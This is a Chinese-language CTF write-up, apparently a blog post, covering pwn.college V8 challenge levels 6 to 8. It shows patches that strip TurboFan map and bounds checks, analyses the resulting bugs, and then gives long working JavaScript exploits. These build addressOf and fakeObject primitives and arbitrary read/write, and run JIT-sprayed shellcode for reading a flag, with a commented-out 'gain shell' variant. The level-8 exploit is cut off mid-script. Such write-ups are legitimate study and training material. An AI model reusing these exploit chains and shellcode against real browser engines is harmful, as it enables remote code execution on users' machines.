     case Builtin::kArrayUnshift:
       return t->cache_->kPositiveSafeInteger;
+  case Builtin::kArrayFunctionMap:
+    return Type::Receiver();
  
     // ArrayBuffer functions.
     case Builtin::kArrayBufferIsView:
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index facf0d86d79..382c015bc48 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -3364,7 +3364,7 @@ Local Shell::CreateNodeTemplates(
  
 Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   Local global_template = ObjectTemplate::New(isolate);
-  global_template->Set(Symbol::GetToStringTag(isolate),
+/*  global_template->Set(Symbol::GetToStringTag(isolate),
                        String::NewFromUtf8Literal(isolate, "global"));
   global_template->Set(isolate, "version",
                        FunctionTemplate::New(isolate, Version));
@@ -3385,13 +3385,13 @@ Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   global_template->Set(isolate, "readline",
                        FunctionTemplate::New(isolate, ReadLine));
   global_template->Set(isolate, "load",
-                       FunctionTemplate::New(isolate, ExecuteFile));
+                       FunctionTemplate::New(isolate, ExecuteFile));*/
   global_template->Set(isolate, "setTimeout",
                        FunctionTemplate::New(isolate, SetTimeout));
   // Some Emscripten-generated code tries to call 'quit', which in turn would
   // call C's exit(). This would lead to memory leaks, because there is no way
   // we can terminate cleanly then, so we need a way to hide 'quit'.
-  if (!options.omit_quit) {
+/*  if (!options.omit_quit) {
     global_template->Set(isolate, "quit", FunctionTemplate::New(isolate, Quit));
   }
   global_template->Set(isolate, "testRunner",
@@ -3410,7 +3410,7 @@ Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   if (i::v8_flags.expose_async_hooks) {
     global_template->Set(isolate, "async_hooks",
                          Shell::CreateAsyncHookTemplate(isolate));
-  }
+  }*/
  
   return global_template;
 }
diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
index 48249695b7b..5e76e66bc15 100644
--- a/src/init/bootstrapper.cc
+++ b/src/init/bootstrapper.cc
@@ -2533,6 +2533,8 @@ void Genesis::InitializeGlobal(Handle global_object,
  
     SimpleInstallFunction(isolate_, proto, "at", Builtin::kArrayPrototypeAt, 1,
                           true);
+  SimpleInstallFunction(isolate_, proto, "functionMap",
+                        Builtin::kArrayFunctionMap, 1, false);
     SimpleInstallFunction(isolate_, proto, "concat",
                           Builtin::kArrayPrototypeConcat, 1, false);
     SimpleInstallFunction(isolate_, proto, "copyWithin", 
```

漏洞利用
----

对于上面的分析，我们就可以尝试构造一个函数，动态的修改 obj 的类型，下面是 addressOf 的编写，采用 switch case 的结构，使用 itr 进行遍历。第一次执行`victim_arr[2] = obj;` ，成功的修改了 map，然后 itr 为 1 的时候，就会解析出来 obj 的地址

idx=1 可以索引出原本 victim_arr[2] 的原因是由于类型发生转换，变成 obj 类型之后，转换成 pointer，对应了四字节（也就是指针压缩），所以索引 arr 的 idx 会发生改变

```
function addressOf(obj){
    let victim_arr = [1.1,2.2,3.3];
    // let object = {};
    let address = 0;
    let itr = 0;
    // p(victim_arr);
    victim_arr.functionMap( val => {
        switch(itr){
            case 0:
                // p(obj)
                // stop();
                itr++;
                victim_arr[2] = obj;
                return val;
            case 1:
                // stop();
                itr++;
                // logg("val",f64_to_u64(val));
                // stop();
                address = u64_to_u32_lo(f64_to_u64(val));
                return val;
            case 2:
                // stop();
                itr++;
                return val;
            default:
                itr++;
                return val;
        }
    });
    return address;
}
```

接着就是 fakeObject，思路是很类似的，这里还是修改 arr 的类型，然后解析穿入地址，伪造成一个 obj，接着调用 arr[0] 返回，索引的问题和上面是一样的，可以动态调试看下

```
function fakeObject(address){
    let arr = [1.1,2.2,3.3];
    let fake_object;
    let obj = {};
    let itr = 0;
    // p(arr);
    // p(obj);
    arr.functionMap(val => {
        switch(itr){
            case 0:
                itr++;
                // stop()
                arr[2] = obj;
                // logg("address",address);
                // stop();
                return lh_u32_to_f64(address,0);
            default:
                // stop();
                itr++;
                return val;
        }
    });
    return arr[0];
}
```

有了 addressOf 和 fakeObject，后面的步骤都是一致的，AAR 和 AAW，最后 JIT Spray

exp
---

```
var buf = new ArrayBuffer(8);
var f32 = new Float32Array(buf);
var f64 = new Float64Array(buf);
var u8 = new Uint8Array(buf);
var u16 = new Uint16Array(buf);
var u32 = new Uint32Array(buf);
var u64 = new BigUint64Array(buf);
 
function lh_u32_to_f64(l,h){
    u32[0] = l;
    u32[1] = h;
    return f64[0];
}
function f64_to_u32l(val){
    f64[0] = val;
    return u32[0];
}
function f64_to_u32h(val){
    f64[0] = val;
    return u32[1];
}
function f64_to_u64(val){
    f64[0] = val;
    return u64[0];
}
function u64_to_f64(val){
    u64[0] = val;
    return f64[0];
}
 
function u64_to_u32_lo(val){
    u64[0] = val;
    return u32[0];
}
 
function u64_to_u32_hi(val){
    u64[0] = val;
    return u32[1];
}
 
 
function stop(){
    %SystemBreak();
}
 
function p(arg){
    %DebugPrint(arg);
}
 
function spin(){
    while(1){};
}
 
function hex(str){
    return str.toString(16).padStart(16,0);
}
 
function logg(str,val){
    console.log("[+] "+ str + ": " + "0x" + hex(val));
}
 
// gain shell
// const shellcode = () => {return [
//     1.9553825422107533e-246,
//     1.9560612558242147e-246,
//     1.9995714719542577e-246,
//     1.9533767332674093e-246,
//     2.6348604765229606e-284
// ];}
 
const shellcode = () => {return [
    1.9710255944286777e-246,
    1.971136949489835e-246,
    1.97118242283721e-246,
    1.9711826272864685e-246,
    1.9712937950614383e-246,
    -1.6956275879669133e-231
];}
 
for(let i = 0; i< 10000; i++){
    shellcode();
}
 
function addressOf(obj){
    let victim_arr = [1.1,2.2,3.3];
    // let object = {};
    let address = 0;
    let itr = 0;
    // p(victim_arr);
    victim_arr.functionMap( val => {
        switch(itr){
            case 0:
                // p(obj)
                // stop();
                itr++;
                victim_arr[2] = obj;
                return val;
            case 1:
                // stop();
                itr++;
                // logg("val",f64_to_u64(val));
                // stop();
                address = u64_to_u32_lo(f64_to_u64(val));
                return val;
            case 2:
                // stop();
                itr++;
                return val;
            default:
                itr++;
                return val;
        }
    });
    return address;
}
 
 
function fakeObject(address){
    let arr = [1.1,2.2,3.3];
    let fake_object;
    let obj = {};
    let itr = 0;
    // p(arr);
    // p(obj);
    arr.functionMap(val => {
        switch(itr){
            case 0:
                itr++;
                // stop()
                arr[2] = obj;
                // logg("address",address);
                // stop();
                return lh_u32_to_f64(address,0);
            default:
                // stop();
                itr++;
                return val;
        }
    });
    return arr[0];
}
 
var fake_map = [
    u64_to_f64(0x31040404001c01b5n),
    u64_to_f64(0x0a8007ff11000844n)
]
 
var fake_map_address = addressOf(fake_map)+0x54;
 
var fake_array = [
    lh_u32_to_f64(fake_map_address,0x0),
    lh_u32_to_f64(0x1,0x1000)
];
 
p(fake_array);
 
var fake_array_address = addressOf(fake_array)+0x54;
var fake_obj = fakeObject(fake_array_address);
 
console.log(typeof fake_obj);
logg("fake_array_address",fake_array_address);
logg("fake_map_address",fake_map_address);
 
 
function AAR(addr){
    fake_array[1] = lh_u32_to_f64(addr-8,0x1000);
    return f64_to_u64(fake_obj[0]);
}
 
function AAW(addr,val){
    fake_array[2] = lh_u32_to_f64(addr-8,0x1000);
    fake_obj[0] = u64_to_f64(val);
}
 
p(shellcode);
var shellcode_addr = addressOf(shellcode);
var code_addr = u64_to_u32_lo(AAR(shellcode_addr+0xc));
var ins_base = AAR((code_addr)+0x14);
 
logg("shellcode_addr",shellcode_addr);
logg("code_addr",code_addr);
logg("ins_base",ins_base);
 
AAW(code_addr+0x14,(BigInt(ins_base)+0x6bn));
 
shellcode();
spin();
```

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_HNVUHEIc97.png)

level-7
=======

> 现在登场的是，因为环境问题卡了最久的:(

环境搭建
----

> 漏洞分析里有完整的 patch 内容

```
git reset --hard 5a2307d0f2c5b650c6858e2b9b57b335a59946ff
gclient sync -D
git apply < ./patch
gn gen out/release
```

修改编译参数

```
➜  release git:(5a2307d0f2c) ✗ cat args.gn
# Set build arguments here. See `gn help buildargs`.
is_component_build = false
is_debug = false
target_cpu = "x64"
v8_enable_sandbox = false
v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true
dcheck_always_on = false
use_goma = false
v8_code_pointer_sandboxing = false
```

接着编译

```
autoninja -C out/release d8
```

漏洞分析
----

这里的 patch 是对于 turbofan 的，可以看到目录是 / src/compiler/turboshaft/，优化阶段是 machine-lowering

这里是删去了对于 map 为空时的检查

```
@@ -2740,7 +2740,7 @@ class MachineLoweringReducer : public Next {
                             const ZoneRefSet& maps, CheckMapsFlags flags,
                             const FeedbackSource& feedback) {
     if (maps.is_empty()) {
-      __ Deoptimize(frame_state, DeoptimizeReason::kWrongMap, feedback);
+      //__ Deoptimize(frame_state, DeoptimizeReason::kWrongMap, feedback);
       return {};
     } 
```

这里一整个将对于 map 检查的操作全部删去了

```
@@ -2749,14 +2749,14 @@ class MachineLoweringReducer : public Next {
       IF_NOT (LIKELY(CompareMapAgainstMultipleMaps(heap_object_map, maps))) {
         // Reloading the map slightly reduces register pressure, and we are on a
         // slow path here anyway.
-        MigrateInstanceOrDeopt(heap_object, __ LoadMapField(heap_object),
-                               frame_state, feedback);
-        __ DeoptimizeIfNot(__ CompareMaps(heap_object, maps), frame_state,
-                           DeoptimizeReason::kWrongMap, feedback);
+        //MigrateInstanceOrDeopt(heap_object, __ LoadMapField(heap_object),
+        //                       frame_state, feedback);
+        //__ DeoptimizeIfNot(__ CompareMaps(heap_object, maps), frame_state,
+        //                   DeoptimizeReason::kWrongMap, feedback);
       }
     } else {
-      __ DeoptimizeIfNot(__ CompareMaps(heap_object, maps), frame_state,
-                         DeoptimizeReason::kWrongMap, feedback);
+      //__ DeoptimizeIfNot(__ CompareMaps(heap_object, maps), frame_state,
+      //                   DeoptimizeReason::kWrongMap, feedback);
     }
     // Inserting a AssumeMap so that subsequent optimizations know the map of
     // this object.
```

总的来看，对于一段代码经过优化后，将不会检查 map 类型。换句话说，这段代码被优化之后，我可以对其操作过的对象的 map 任意修改

完整的 patch 内容

```
diff --git a/src/compiler/turboshaft/machine-lowering-reducer-inl.h b/src/compiler/turboshaft/machine-lowering-reducer-inl.h
index 170db78717b..17b0fe5c4e9 100644
--- a/src/compiler/turboshaft/machine-lowering-reducer-inl.h
+++ b/src/compiler/turboshaft/machine-lowering-reducer-inl.h
@@ -2740,7 +2740,7 @@ class MachineLoweringReducer : public Next {
                             const ZoneRefSet& maps, CheckMapsFlags flags,
                             const FeedbackSource& feedback) {
     if (maps.is_empty()) {
-      __ Deoptimize(frame_state, DeoptimizeReason::kWrongMap, feedback);
+      //__ Deoptimize(frame_state, DeoptimizeReason::kWrongMap, feedback);
       return {};
     }
  
@@ -2749,14 +2749,14 @@ class MachineLoweringReducer : public Next {
       IF_NOT (LIKELY(CompareMapAgainstMultipleMaps(heap_object_map, maps))) {
         // Reloading the map slightly reduces register pressure, and we are on a
         // slow path here anyway.
-        MigrateInstanceOrDeopt(heap_object, __ LoadMapField(heap_object),
-                               frame_state, feedback);
-        __ DeoptimizeIfNot(__ CompareMaps(heap_object, maps), frame_state,
-                           DeoptimizeReason::kWrongMap, feedback);
+        //MigrateInstanceOrDeopt(heap_object, __ LoadMapField(heap_object),
+        //                       frame_state, feedback);
+        //__ DeoptimizeIfNot(__ CompareMaps(heap_object, maps), frame_state,
+        //                   DeoptimizeReason::kWrongMap, feedback);
       }
     } else {
-      __ DeoptimizeIfNot(__ CompareMaps(heap_object, maps), frame_state,
-                         DeoptimizeReason::kWrongMap, feedback);
+      //__ DeoptimizeIfNot(__ CompareMaps(heap_object, maps), frame_state,
+      //                   DeoptimizeReason::kWrongMap, feedback);
     }
     // Inserting a AssumeMap so that subsequent optimizations know the map of
     // this object.
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index facf0d86d79..382c015bc48 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -3364,7 +3364,7 @@ Local Shell::CreateNodeTemplates(
  
 Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   Local global_template = ObjectTemplate::New(isolate);
-  global_template->Set(Symbol::GetToStringTag(isolate),
+/*  global_template->Set(Symbol::GetToStringTag(isolate),
                        String::NewFromUtf8Literal(isolate, "global"));
   global_template->Set(isolate, "version",
                        FunctionTemplate::New(isolate, Version));
@@ -3385,13 +3385,13 @@ Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   global_template->Set(isolate, "readline",
                        FunctionTemplate::New(isolate, ReadLine));
   global_template->Set(isolate, "load",
-                       FunctionTemplate::New(isolate, ExecuteFile));
+                       FunctionTemplate::New(isolate, ExecuteFile));*/
   global_template->Set(isolate, "setTimeout",
                        FunctionTemplate::New(isolate, SetTimeout));
   // Some Emscripten-generated code tries to call 'quit', which in turn would
   // call C's exit(). This would lead to memory leaks, because there is no way
   // we can terminate cleanly then, so we need a way to hide 'quit'.
-  if (!options.omit_quit) {
+/*  if (!options.omit_quit) {
     global_template->Set(isolate, "quit", FunctionTemplate::New(isolate, Quit));
   }
   global_template->Set(isolate, "testRunner",
@@ -3410,7 +3410,7 @@ Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   if (i::v8_flags.expose_async_hooks) {
     global_template->Set(isolate, "async_hooks",
                          Shell::CreateAsyncHookTemplate(isolate));
-  }
+  }*/
  
   return global_template;
 } 
```

漏洞利用
----

接着写一个 poc 验证我们的想法，下面的结果是成功验证了

```
var buf = new ArrayBuffer(8);
var f32 = new Float32Array(buf);
var f64 = new Float64Array(buf);
var u8 = new Uint8Array(buf);
var u16 = new Uint16Array(buf);
var u32 = new Uint32Array(buf);
var u64 = new BigUint64Array(buf);
 
function lh_u32_to_f64(l,h){
    u32[0] = l;
    u32[1] = h;
    return f64[0];
}
function f64_to_u32l(val){
    f64[0] = val;
    return u32[0];
}
function f64_to_u32h(val){
    f64[0] = val;
    return u32[1];
}
function f64_to_u64(val){
    f64[0] = val;
    return u64[0];
}
function u64_to_f64(val){
    u64[0] = val;
    return f64[0];
}
 
function u64_to_u32_lo(val){
    u64[0] = val;
    return u32[0];
}
 
function u64_to_u32_hi(val){
    u64[0] = val;
    return u32[1];
}
 
function f64_to_u32_lo(val){
    f64[0] = val;
    return u32[0];
}
 
function f64_to_u32_hi(val){
    f64[0] = val;
    return u32[1];
}
 
function stop(){
    %SystemBreak();
}
 
function p(arg){
    %DebugPrint(arg);
}
 
function spin(){
    while(1){};
}
 
function hex(str){
    return str.toString(16).padStart(16,0);
}
 
function logg(str,val){
    console.log("[+] "+ str + ": " + "0x" + hex(val));
}
 
var flag = false;
var array = [1.1,2.2,3.3];
 
function bypass(obj){
    if(flag) array[1] = obj;
}
 
function trigger(arr,obj){
    if(flag || 1){
        bypass(obj);
    }
    return arr[0];
}
 
%OptimizeFunctionOnNextCall(trigger);
 
trigger(array);
 
%OptimizeFunctionOnNextCall(trigger);
 
let a ={};
p(a);
flag = true;
let address = f64_to_u32_hi(trigger(array,a));
 
logg("obj addr",address);
```

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_uUEXau_VnE.png)

使用 Turbolizer 分析下，选择到 BuildGraph 阶段

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_-K9zsiqUV2.png)

此时存在 checkmap 的检查，结合 diff，发生在机器码优化阶段之前

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_0WJ0FA9938.png)

接着将调到 MachineLowering 阶段

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_mjBDrVnD4Q.png)

可以发现原本的 CheckMaps 已经变成了 AssumeMap，AssumeMap 意味着假设对象的 map 不会改变，对应 diff 里的逻辑就是不对 map 进行任何检查

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_InHZPEUVaU.png)

后方已经不存在任何的 map 检查

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_a2tqj0abMh.png)

可以聊一下这里 addressOf 的编写。通过分析上述优化阶段可以发现，该补丁实际上只影响 TurboFan 优化器。因此，只有在代码被 TurboFan 优化时，才可能触发前述漏洞。自 2021 年 V8 引入 Maglev 后，在不满足直接使用 TurboFan 优化条件的情况下，Ignition 生成的字节码会先由 Maglev 生成 SSA 和 CFG，随后再交由 TurboFan 进一步优化。由于这种优化路径的不同，上述漏洞在该路径下不会被触发。

所以我们需要增加函数的复杂性和执行时间，一步到位的去直接跳过 Maglev 的优化

复杂性方面无需多言，而在执行时间方面，TurboFan 会评估编译优化该函数所需的时间与该函数未优化时的执行时间，只有当优化能够带来明显的性能提升时，TurboFan 才会选择对该函数进行优化。

下面采用了 if(flag || idx < 1) 的分支结构，防止下方的 bypass 函数被优化

```
function addressOf(obj){
    let array;
    let address;
    let flag;
 
    function bypass(obj){
        if(flag) {
            // p(array);
            array[2] = obj;
            // p(array);
        }
    }
     
    function trigger(arr,idx){
        for (let i = 0; i < 0x10000; i++){};
        array[0] = 3.3;
        if(flag || idx < 1){
            bypass(obj);
        }
        return arr[1];
    }
 
    flag = false;
    for(let i = 0; i < 0x1000; i++){
        array = [1.1,2.2,3.3];
        trigger(array,i);
    }
 
    flag = true;
    address = trigger(array,obj);
    return f64_to_u32_lo(address);
}
```

其实后续发现采用 try-catch 的结构也可以增加成功率，不过笔者并没有提供 try-catch 结构的 exp，

```
function addressOf(obj){
    let array = [1.1,2.2,3.3];
    let address;
    let flag;
 
    function bypass(obj){
        if(flag) {
            // p(array);
            array[2] = obj;
            // p(array);
        }
    }
     
    function trigger(arr,idx){
        try {
            for (let i = 0; i < 0x10000; i++){};
            if(flag || idx < 1){
                bypass(obj);
            }
            return arr[1];
          } catch (e) {
            return 0;
          }
    }
 
    flag = false;
    for(let i = 0; i < 0x1000; i++){
        trigger(array,i);
    }
 
    flag = true;
    address = trigger(array,obj);
    return f64_to_u32_lo(address);
}
```

后面的构造步骤基本一致，然后需要注意的点就是，调用完 addressOf 之后，大概率触发 gc，会导致堆布局的变化

exp
---

最后的脚本，远程环境中成功率不高，得多试几次（写个爆破脚本也不是不行

```
var buf = new ArrayBuffer(8);
var f32 = new Float32Array(buf);
var f64 = new Float64Array(buf);
var u8 = new Uint8Array(buf);
var u16 = new Uint16Array(buf);
var u32 = new Uint32Array(buf);
var u64 = new BigUint64Array(buf);
 
// function gc() {
//     for (let i=0;i<0x10;i++) new ArrayBuffer(0x1000000);
// }
 
// function js_heap_defragment() {
//     gc();
//     for (let i=0;i<0x1000;i++) new ArrayBuffer(0x10);
//     for (let i=0;i<0x1000;i++) new Uint32Array(1);
// }
 
 
function lh_u32_to_f64(l,h){
    u32[0] = l;
    u32[1] = h;
    return f64[0];
}
function f64_to_u32l(val){
    f64[0] = val;
    return u32[0];
}
function f64_to_u32h(val){
    f64[0] = val;
    return u32[1];
}
function f64_to_u64(val){
    f64[0] = val;
    return u64[0];
}
function u64_to_f64(val){
    u64[0] = val;
    return f64[0];
}
 
function u64_to_u32_lo(val){
    u64[0] = val;
    return u32[0];
}
 
function u64_to_u32_hi(val){
    u64[0] = val;
    return u32[1];
}
 
function f64_to_u32_lo(val){
    f64[0] = val;
    return u32[0];
}
 
function f64_to_u32_hi(val){
    f64[0] = val;
    return u32[1];
}
 
// function stop(){
//     %SystemBreak();
// }
 
// function p(arg){
//     %DebugPrint(arg);
// }
 
function spin(){
    while(1){};
}
 
function hex(str){
    return str.toString(16).padStart(16,0);
}
 
function logg(str,val){
    console.log("[+] "+ str + ": " + "0x" + hex(val));
}
 
 
 
// catflag
const shellcode = () => {return [
    1.9710255944286777e-246,
    1.971136949489835e-246,
    1.97118242283721e-246,
    1.9711826272864685e-246,
    1.9712937950614383e-246,
    -1.6956275879669133e-231
];}
 
 
// // gain shell
// const shellcode = () => {return [
//     1.9553825422107533e-246,
//     1.9560612558242147e-246,
//     1.9995714719542577e-246,
//     1.9533767332674093e-246,
//     2.6348604765229606e-284
// ];}
 
for(let i = 0; i< 0x10000; i++){
    shellcode();
}
 
// js_heap_defragment();
 
 
function addressOf(obj){
    let array;
    let address;
    let flag;
 
    function bypass(obj){
        if(flag) {
            // p(array);
            array[2] = obj;
            // p(array);
        }
    }
     
    function trigger(arr,idx){
        for (let i = 0; i < 0x10000; i++){};
        array[0] = 3.3;
        if(flag || idx < 1){
            bypass(obj);
        }
        return arr[1];
    }
 
    flag = false;
    for(let i = 0; i < 0x1000; i++){
        array = [1.1,2.2,3.3];
        trigger(array,i);
    }
 
    flag = true;
    address = trigger(array,obj);
    return f64_to_u32_lo(address);
}
 
var shellcode_addr = addressOf(shellcode);
 
// p(fake_array);
// p(shellcode);
 
// p(double_array_map);
logg("shellcode_addr",shellcode_addr);
 
 
 
function fakeObject(addr){
    let array;
    let flag;
    function bypass(addr){
        if(flag) {
            // p(array);
            array[2] = {};
            // p(array);
        }
    }
     
    function trigger(arr,idx,addr){
        for (let i = 0; i < 0x10000; i++){};
        array[0] = 3.3;
        if(flag || idx < 1){
            bypass(addr);
        }
        array[0] = lh_u32_to_f64(addr,0);
    }
 
    flag = false;
    for(let i = 0; i < 0x1000; i++){
        array = [1.1,2.2,3.3];
        trigger(array,i,addr);
    }
 
    flag = true;
    trigger(array,0x0,addr);
    return array[0];
}
 
// var double_array_map = [
//     u64_to_f64(0x31040404001c01b5n),
//     u64_to_f64(0x0a8007ff11000844n)
// ];
 
var double_array_map_addr = 0x1cb7f9;
 
 
var fake_array = [
    lh_u32_to_f64(double_array_map_addr,0x0),
    lh_u32_to_f64(0x0,0x1000)
];
 
var fake_array_addr = addressOf(fake_array)+0x54;
 
// p(fake_array);
 
 
logg("double_array_map_addr",double_array_map_addr);
logg("fake_array_addr",fake_array_addr);
 
var fake_obj = fakeObject(fake_array_addr);
// console.log(typeof fake_obj);
 
function AAR(addr){
    fake_array[1] = lh_u32_to_f64(addr-8,0x1000);
    return f64_to_u64(fake_obj[0]);
}
 
function AAW(addr,val){
    fake_array[1] = lh_u32_to_f64(addr-8,0x1000);
    fake_obj[0] = u64_to_f64(val);
}
var code_addr = u64_to_u32_lo(AAR(shellcode_addr+0xc));
var ins_base = AAR((code_addr)+0x14);
 
 
logg("code_addr",code_addr);
logg("ins_base",ins_base);
 
AAW(code_addr+0x14,(BigInt(ins_base)+0x6bn));
 
// stop();
shellcode();
 
// spin();
```

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_EMDOHolA2D.png)

level-8
=======

环境搭建
----

> 漏洞分析里有完整的 patch 内容

```
git reset --hard 5a2307d0f2c5b650c6858e2b9b57b335a59946ff
gclient sync -D
git apply < ./patch
gn gen out/release
```

修改编译参数

```
➜  current cat args.gn
# Set build arguments here. See `gn help buildargs`.
is_component_build = false
is_debug = false
target_cpu = "x64"
v8_enable_sandbox = false
v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true
dcheck_always_on = false
use_goma = false
v8_code_pointer_sandboxing = false
```

接着编译

```
autoninja -C out/release d8
```

漏洞分析
----

patch 里主要的变动区域在这里，发生在这个阶段 simplified-lowering，这个函数的流程是与边界检查有关的，也就是类似于数组索引的操作，进入 turbofan 优化的时候，会调用到这个函数

主要在于下方删去了`if (v8_flags.turbo_typer_hardening)` 替换为`if (false /*v8_flags.turbo_typer_hardening*/)` ，这就意味着会直接执行到`DeferReplacement(node, NodeProperties::GetValueInput(node, 0));` ，而这个语句的作用就是直接消除边界检查，那么意思就是说，一段执行过索引数组操作的代码，被 turbofan 优化过后，数组就不存在边界检查，也就是任意的 oob

```
diff --git a/src/compiler/simplified-lowering.cc b/src/compiler/simplified-lowering.cc
index 02a53ebcc21..006351a3f08 100644
--- a/src/compiler/simplified-lowering.cc
+++ b/src/compiler/simplified-lowering.cc
@@ -1888,11 +1888,11 @@ class RepresentationSelector {
         if (lower()) {
           if (index_type.IsNone() || length_type.IsNone() ||
               (index_type.Min() >= 0.0 &&
-               index_type.Max() < length_type.Min())) {
+               index_type.Min() < length_type.Min())) {
             // The bounds check is redundant if we already know that
             // the index is within the bounds of [0.0, length[.
             // TODO(neis): Move this into TypedOptimization?
-            if (v8_flags.turbo_typer_hardening) {
+            if (false /*v8_flags.turbo_typer_hardening*/) {
               new_flags |= CheckBoundsFlag::kAbortOnOutOfBounds;
             } else {
               DeferReplacement(node, NodeProperties::GetValueInput(node, 0)); 
```

完整的 patch

```
diff --git a/src/compiler/simplified-lowering.cc b/src/compiler/simplified-lowering.cc
index 02a53ebcc21..006351a3f08 100644
--- a/src/compiler/simplified-lowering.cc
+++ b/src/compiler/simplified-lowering.cc
@@ -1888,11 +1888,11 @@ class RepresentationSelector {
         if (lower()) {
           if (index_type.IsNone() || length_type.IsNone() ||
               (index_type.Min() >= 0.0 &&
-               index_type.Max() < length_type.Min())) {
+               index_type.Min() < length_type.Min())) {
             // The bounds check is redundant if we already know that
             // the index is within the bounds of [0.0, length[.
             // TODO(neis): Move this into TypedOptimization?
-            if (v8_flags.turbo_typer_hardening) {
+            if (false /*v8_flags.turbo_typer_hardening*/) {
               new_flags |= CheckBoundsFlag::kAbortOnOutOfBounds;
             } else {
               DeferReplacement(node, NodeProperties::GetValueInput(node, 0));
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index facf0d86d79..382c015bc48 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -3364,7 +3364,7 @@ Local Shell::CreateNodeTemplates(
  
 Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   Local global_template = ObjectTemplate::New(isolate);
-  global_template->Set(Symbol::GetToStringTag(isolate),
+/*  global_template->Set(Symbol::GetToStringTag(isolate),
                        String::NewFromUtf8Literal(isolate, "global"));
   global_template->Set(isolate, "version",
                        FunctionTemplate::New(isolate, Version));
@@ -3385,13 +3385,13 @@ Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   global_template->Set(isolate, "readline",
                        FunctionTemplate::New(isolate, ReadLine));
   global_template->Set(isolate, "load",
-                       FunctionTemplate::New(isolate, ExecuteFile));
+                       FunctionTemplate::New(isolate, ExecuteFile));*/
   global_template->Set(isolate, "setTimeout",
                        FunctionTemplate::New(isolate, SetTimeout));
   // Some Emscripten-generated code tries to call 'quit', which in turn would
   // call C's exit(). This would lead to memory leaks, because there is no way
   // we can terminate cleanly then, so we need a way to hide 'quit'.
-  if (!options.omit_quit) {
+/*  if (!options.omit_quit) {
     global_template->Set(isolate, "quit", FunctionTemplate::New(isolate, Quit));
   }
   global_template->Set(isolate, "testRunner",
@@ -3410,7 +3410,7 @@ Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   if (i::v8_flags.expose_async_hooks) {
     global_template->Set(isolate, "async_hooks",
                          Shell::CreateAsyncHookTemplate(isolate));
-  }
+  }*/
  
   return global_template;
 } 
```

漏洞利用
----

通过上面的分析，笔者先写了一个验证的 poc

```
var oob_array = [1.1,2.2,3.3];
var f64 = new Float64Array(1);
var u32 = new Uint32Array(f64.buffer);
 
function f2i(val){
    f64[0] = val;
    return u32[0];
}
 
function trigger(idx) {
    oob_array[idx] = f64[0];
    u32[0] = 0x41414141;
    oob_array[idx] = f64[0];
    return f2i(oob_array[idx]);
}
 
 
%OptimizeFunctionOnNextCall(trigger);
trigger(1);
 
 
%OptimizeFunctionOnNextCall(trigger);
%DebugPrint(oob_array);
console.log("oob_array[3]: 0x" + trigger(3).toString(16));
```

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_hnMqY8viEJ.png)

可以发现这里已经越界成功了，那么就依照这个思路去写 addressof，可以凭借这里的越界读写去直接修改 elements，这样就可以直接得到 AAR 和 AAW，后面思路也是一致

> 比较抽象的点就是环境，因为使用了 JIT Spray，所以很容易触发 gc，从而导致堆布局变化，而且即使本地使用了与远程一致的 docker 环境，最后和远程环境还是不一样，所以需要调……（很没必要的时间，在这种问题上）  
> 因为这个 level-8 的环境存在 Maglev，所以不太好调，可以在 d8 执行参数上加上 --trace-opt，观察优化的情况

exp
---

```
var buf = new ArrayBuffer(8);
var f32 = new Float32Array(buf);
var f64 = new Float64Array(buf);
var u8 = new Uint8Array(buf);
var u16 = new Uint16Array(buf);
var u32 = new Uint32Array(buf);
var u64 = new BigUint64Array(buf);
 
function lh_u32_to_f64(l,h){
    u32[0] = l;
    u32[1] = h;
    return f64[0];
}
function f64_to_u32l(val){
    f64[0] = val;
    return u32[0];
}
function f64_to_u32h(val){
    f64[0] = val;
    return u32[1];
}
function f64_to_u64(val){
    f64[0] = val;
    return u64[0];
}
function u64_to_f64(val){
    u64[0] = val;
    return f64[0];
}
 
function u64_to_u32_lo(val){
    u64[0] = val;
    return u32[0];
}
 
function u64_to_u32_hi(val){
    u64[0] = val;
    return u32[1];
}
 
 
// function stop(){
//     %SystemBreak();
// }
 
// function p(arg){
//     %DebugPrint(arg);
// }
 
// function spin(){
//     while(1){};
// }
 
function hex(str){
    return str.toString(16).padStart(16,0);
}
 
function logg(str,val){
    console.log("[+] "+ str + ": " + "0x" + hex(val));
}
 
function gc() {
    for (let i=0;i<0x10;i++) new ArrayBuffer(0x1000000);
}
 
function js_heap_defragment() {
    gc();
    for (let i=0;i<0x1000;i++) new ArrayBuffer(0x10);
    for (let i=0;i<0x1000;i++) new Uint32Array(1);
}
 
// // catflag
const shellcode = () => {return [
    1.0,
    1.9710255944286777e-246,
    1.971136949489835e-246,
    1.97118242283721e-246,
    1.9711826272864685e-246,
    1.9712937950614383e-246,
    -1.6956275879669133e-231
];}
 
// gain shell
// const shellcode = () => {return [
//     1.9553825422107533e-246,
//     1.9560612558242147e-246,
//     1.9995714719542577e-246,
//     1.9533767332674093e-246,
//     2.6348604765229606e-284
// ];}
 
